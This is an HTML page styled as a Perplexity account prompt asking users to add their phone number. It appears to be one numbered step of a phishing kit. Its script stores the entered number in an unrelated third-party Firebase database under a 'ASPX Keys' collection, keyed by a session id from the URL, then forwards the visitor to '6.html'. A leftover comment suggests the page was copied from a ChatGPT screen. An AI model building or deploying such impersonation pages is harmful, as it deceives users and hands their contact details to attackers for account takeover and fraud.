<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Your Phone Number</title>
    <style>
        /* Define CSS Variables for Light Mode (Default) */
        :root {
            --bg-color: #ffffff;
            --text-primary: #2d333a;
            --text-secondary: #6e6e80;
            --input-bg: #ffffff;
            --input-border: #c2c8d0;
            --input-border-focus: #000000;
            --label-bg: #ffffff;
            --btn-bg: #0f172a;
            --btn-bg-hover: #1e293b;
            --btn-text: #ffffff;
        }

        /* Define CSS Variables for Dark Mode */
        [data-theme="dark"] {
            --bg-color: #000000;
            --text-primary: #ffffff;
            --text-secondary: #a1a1aa;
            --input-bg: #000000;
            --input-border: #52525b;
            --input-border-focus: #ffffff;
            --label-bg: #000000;
            --btn-bg: #ffffff;
            --btn-bg-hover: #e4e4e7;
            --btn-text: #000000;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: var(--bg-color);
            color: var(--text-primary);
            transition: background-color 0.3s, color 0.3s;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--text-primary);
            letter-spacing: -0.5px;
        }

        p {
            font-size: 16px;
            color: var(--text-secondary);
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--label-bg);
            padding: 0 5px;
            font-size: 12px;
            color: var(--text-secondary);
            z-index: 1;
            transition: background-color 0.3s, color 0.3s;
        }

        input[type="tel"] {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            background-color: var(--input-bg);
            color: var(--text-primary);
            border: 1px solid var(--input-border);
            border-radius: 30px;
            outline: none;
            transition: border-color 0.2s, background-color 0.3s, color 0.3s;
        }

        input[type="tel"]:focus {
            border-color: var(--input-border-focus);
        }

        /* Remove arrows from number input */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .btn-continue {
            width: 100%;
            padding: 14px;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s, color 0.3s;
        }

        .btn-continue:hover {
            background-color: var(--btn-bg-hover);
        }

        .error-msg {
            color: #d93025;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>
    
    <!-- Theme Detection Script -->
    <script>
        function applyTheme() {
            const urlParams = new URLSearchParams(window.location.search);
            const themeParam = urlParams.get('theme');
            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

            if (themeParam === 'dark') {
                document.documentElement.setAttribute('data-theme', 'dark');
            } else if (themeParam === 'light') {
                document.documentElement.setAttribute('data-theme', 'light');
            } else {
                // Fallback to real-time device native theme
                document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
            }
        }

        // Apply theme immediately to prevent flashing
        applyTheme();

        // Listen for real-time changes in native device theme
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
            const urlParams = new URLSearchParams(window.location.search);
            // Only auto-switch if theme is NOT hardcoded in URL
            if (!urlParams.has('theme')) {
                document.documentElement.setAttribute('data-theme', e.matches ? 'dark' : 'light');
            }
        });
    </script>
</head>
<body>

    <div class="container">
        <!-- ChatGPT Text Removed as requested -->
        
        <h1>Add Your Phone Number</h1>
        <p>You can use your phone number to sign in to your Perplexity Account and reset your password if you forgot it. This won't make your number public.</p>

        <div class="input-group">
            <span class="input-label">Mobile Number</span>
            <input type="tel" id="mobileNumber" placeholder="1234567890" maxlength="10" autocomplete="off">
            <div id="error" class="error-msg">Please enter a valid 10-digit number</div>
        </div>

        <button class="btn-continue" id="submitBtn">Continue</button>
    </div>

    <!-- Firebase Scripts -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Get elements
        const phoneInput = document.getElementById('mobileNumber');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('error');

        // Function to get Parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const themeParam = urlParams.get('theme');

        // Restriction: Only allow 10 digits
        phoneInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
            errorMsg.style.display = 'none';
        });

        // Handle submission
        const handleSubmit = async () => {
            const number = phoneInput.value;

            if (number.length !== 10) {
                errorMsg.style.display = 'block';
                return;
            }

            if (!sessionId) {
                alert("Session ID missing in URL");
                return;
            }

            try {
                // Reference the specific document in "ASPX Keys" collection
                const docRef = doc(db, "ASPX Keys", sessionId);
                
                // Update the document with the mobile number
                await updateDoc(docRef, {
                    mobileNumber: number,
                    updatedAt: serverTimestamp()
                });

                // Redirect to 6.html with same session ID and carry over the theme parameter if it exists
                let nextUrl = `6.html?session=${sessionId}`;
                if (themeParam) {
                    nextUrl += `&theme=${themeParam}`;
                }
                
                window.location.href = nextUrl;

            } catch (e) {
                console.error("Error updating document: ", e);
                alert("An error occurred. Please try again.");
            }
        };

        // Click Event
        submitBtn.addEventListener('click', handleSubmit);

        // Enter Key Event
        phoneInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleSubmit();
            }
        });
    </script>
</body>
</html>
